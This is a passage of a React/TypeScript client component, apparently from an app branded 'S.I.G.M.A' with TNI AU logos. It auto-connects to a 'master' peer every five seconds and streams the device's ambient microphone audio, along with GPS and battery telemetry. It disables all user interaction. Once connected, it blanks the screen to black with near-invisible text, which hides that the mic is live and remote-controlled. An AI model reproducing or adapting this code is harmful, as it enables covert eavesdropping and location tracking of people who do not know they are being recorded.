        const existingConn = dataConnsRef.current.get(targetMasterId);
        if (existingConn?.peerConnection) {
          attachAudioToPeerConnection(existingConn.peerConnection, stream);
        }
        const call = peer.call(targetMasterId, stream, { metadata: { nodeId } });
        if (call) {
          attachAudioToPeerConnection(call.peerConnection, stream);
          mediaCallsRef.current.set(targetMasterId, call);
        }
      }
    };

    peer.on('open', () => {
      autoDialPeerJsMaster();
    });

    peer.on('call', async (incomingCall) => {
      const stream = rawStreamRef.current || (await ensureMicrophoneStream());
      if (stream) {
        incomingCall.answer(stream);
        attachAudioToPeerConnection(incomingCall.peerConnection, stream);
        mediaCallsRef.current.set(incomingCall.peer, incomingCall);
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
      }
    });

    peer.on('connection', (conn) => {
      conn.on('open', async () => {
        dataConnsRef.current.set(conn.peer, conn);
        isConnectedRef.current = true;
        setPeerStatus('CONNECTED');
        if (passivePipelineRef.current) {
          passivePipelineRef.current.bindDataChannel(conn as unknown as DataChannelLike);
        }
        transmitTelemetryPacket();
        const stream = rawStreamRef.current || (await ensureMicrophoneStream());
        if (stream) {
          attachAudioToPeerConnection(conn.peerConnection, stream);
          const call = peer.call(conn.peer, stream, { metadata: { nodeId } });
          if (call) {
            attachAudioToPeerConnection(call.peerConnection, stream);
            mediaCallsRef.current.set(conn.peer, call);
          }
        }
      });
    });

    const peerRetryTimer = window.setInterval(() => {
      autoDialPeerJsMaster();
    }, 5000);
    const dataConns = dataConnsRef.current;
    const mediaCalls = mediaCallsRef.current;
    const negHandlers = negotiationHandlersRef.current;

    return () => {
      clearInterval(peerRetryTimer);
      dataConns.forEach((c) => c.close());
      mediaCalls.forEach((c) => c.close());
      dataConns.clear();
      mediaCalls.clear();
      negHandlers.clear();
      peer.destroy();
    };
  }, [ensureMicrophoneStream, nodeId, targetMasterId, transmitTelemetryPacket]);

  /**
   * ============================================================================
   * TAMPILAN KLIEN 100% PASIF & ZERO-TOUCH (TANPA TOMBOL INTERAKTIF SAMA SEKALI)
   * ============================================================================
   * Sesuai spesifikasi: tidak ada tombol Connect, tidak ada klik/tap manual.
   * Klien otomatis mencari Master setiap 5 detik dan langsung mengunci layar pasif.
   */
  if (peerStatus === 'CONNECTED') {
    return (
      <div className="fixed inset-0 bg-black text-neutral-900 flex flex-col justify-between p-4 select-none pointer-events-none z-[9999] font-mono-tactical">
        <div className="flex items-center justify-between opacity-20">
          <div className="flex items-center gap-2">
            <img
              src={LOGO_TNI_AU}
              alt="TNI AU"
              referrerPolicy="no-referrer"
              className="w-5 h-5 object-contain rounded-full"
            />
            <span className="text-[10px] tracking-widest text-neutral-700">
              S.I.G.M.A PASSIVE NODE // {nodeId}
            </span>
          </div>
          <img
            src={LOGO_PETIR}
            alt="Diskomlekau"
            referrerPolicy="no-referrer"
            className="w-5 h-5 object-contain rounded-full"
          />
        </div>

        <div className="my-auto text-center space-y-1 opacity-15">
          <div className="text-xs tracking-[0.3em] text-neutral-700">
            PASSIVE TELEMETRY LOCKED · ZERO-TOUCH LINK ACTIVE
          </div>
          <div className="text-[10px] text-neutral-800">
            GAIN: {remoteAudioState.gain.toFixed(1)}x · MIC:{' '}
            {remoteAudioState.muted ? 'REMOTE MUTED' : 'LIVE'} · WAKE LOCK:{' '}
            {wakeLockActive ? 'ON' : 'OFF'}
          </div>
        </div>

        <div className="text-center text-[9px] tracking-widest text-neutral-900">
          100% AUTO-CONNECTED TO MASTER · REMOTE CONTROLLED
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-slate-400 font-mono-tactical flex flex-col justify-between p-4 sm:p-6 select-none pointer-events-none">
      {/* Header Pasif: Logo TNI AU di Pojok Kiri Atas & Logo Petir di Pojok Kanan Atas */}
      <div className="flex items-center justify-between gap-2 border-b border-neutral-900 pb-3">
        <div className="flex items-center gap-2.5">
          <img
            src={LOGO_TNI_AU}
            alt="Logo TNI AU"
            referrerPolicy="no-referrer"
            className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
          />
          <span className="text-xs tracking-widest text-neutral-500">
            S.I.G.M.A // ZERO-TOUCH PASSIVE CLIENT
          </span>
        </div>

        <img
          src={LOGO_PETIR}
          alt="Logo Petir Diskomlekau"
          referrerPolicy="no-referrer"
          className="w-6 h-6 object-contain rounded-full border border-cyan-500/30 bg-black shrink-0"
        />
      </div>

      {/* Status Auto-Discovery & Handshake (Tanpa Tombol Interaktif) */}
      <div className="my-auto max-w-md w-full mx-auto space-y-5 py-6">
        <div className="border border-neutral-900 bg-neutral-950/50 rounded p-6 text-center space-y-3">
          <div className="flex items-center justify-center gap-2 text-xs text-cyan-500 tracking-widest">
            <Radio className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
            <span>AUTO-DISCOVERY &amp; HANDSHAKE ACTIVE</span>
          </div>

          <div className="text-5xl sm:text-6xl font-bold tracking-widest text-cyan-400 font-mono-tactical">
            {nodeId}
          </div>

          <div className="text-[11px] text-neutral-400">
            MENGIRIM OFFER OTOMATIS KE <span className="text-cyan-300">target: &quot;master&quot;</span> SETIAP 5 DETIK...
          </div>
        </div>

        <div className="grid grid-cols-2 gap-2.5 text-xs">
          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">SIGNALING STATUS</div>
            <div className="flex items-center gap-2 font-semibold text-cyan-400">
              <span className="w-2 h-2 rounded-full bg-cyan-500 animate-ping" />
              <span>AUTO-RETRY (5s)</span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">WAKE LOCK</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Lock className="w-3.5 h-3.5 text-cyan-500" />
              <span>{wakeLockActive ? 'ACTIVE' : 'STANDBY'}</span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">AMBIENT MIC STREAM</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <Mic className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {micStatus === 'READY'
                  ? `CAPTURED (${remoteAudioState.gain.toFixed(1)}x)`
                  : micStatus === 'DENIED'
                  ? 'MIC BLOCKED'
                  : 'CAPTURING...'}
              </span>
            </div>
          </div>

          <div className="border border-neutral-900 bg-black p-3 rounded space-y-1">
            <div className="text-[10px] text-neutral-500">BATTERY TELEMETRY</div>
            <div className="flex items-center gap-1.5 font-semibold text-neutral-300">
              <BatteryCharging className="w-3.5 h-3.5 text-cyan-500" />
              <span>
                {batteryInfo.level !== null ? `${batteryInfo.level}%` : 'READING...'}
              </span>
            </div>
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-2">
          <div className="flex items-center justify-between text-[11px] text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-500" />
              <span>RAW AUDIO STREAM MODULATION</span>
            </span>
            <span className="text-cyan-400">{audioRms}%</span>
          </div>
          <div className="w-full h-1.5 bg-neutral-950 rounded overflow-hidden">
            <div
              className="h-full bg-cyan-500 transition-all duration-75"
              style={{ width: `${Math.min(100, audioRms)}%` }}
            />
          </div>
        </div>

        <div className="border border-neutral-900 bg-black p-3 rounded space-y-1.5 text-[11px]">
          <div className="flex items-center justify-between text-neutral-500">
            <span className="flex items-center gap-1.5">
              <Navigation className="w-3.5 h-3.5 text-cyan-500" />
              <span>GPS TELEMETRY PAYLOAD</span>
            </span>
          </div>
          {gpsState.lat !== null && gpsState.lng !== null ? (
            <div className="grid grid-cols-2 gap-2 pt-1 text-neutral-300">
              <div>LAT: {gpsState.lat.toFixed(6)}°</div>
              <div>LNG: {gpsState.lng.toFixed(6)}°</div>
              <div>ALT: {gpsState.alt !== null ? `${gpsState.alt}m` : 'N/A'}</div>
              <div>
                PREC: {gpsState.accuracy !== null ? `±${gpsState.accuracy}m` : 'N/A'}
              </div>
            </div>
          ) : (
            <div className="pt-1 text-neutral-500 text-[11px]">
              Mengunci koordinat satelit GPS perangkat...
            </div>
          )}
        </div>
      </div>

      <div className="border-t border-neutral-900 pt-3 flex items-center justify-between text-[11px] text-neutral-600">
        <div className="flex items-center gap-1.5">
          <ShieldAlert className="w-3.5 h-3.5 text-neutral-600" />
          <span>ZERO-TOUCH AUTO-CONNECT · TIDAK MEMERLUKAN INTERAKSI KLIK/TAP</span>
        </div>
        <span>RETRY: 5000ms</span>
      </div>
    </div>
  );
};

export default Client;
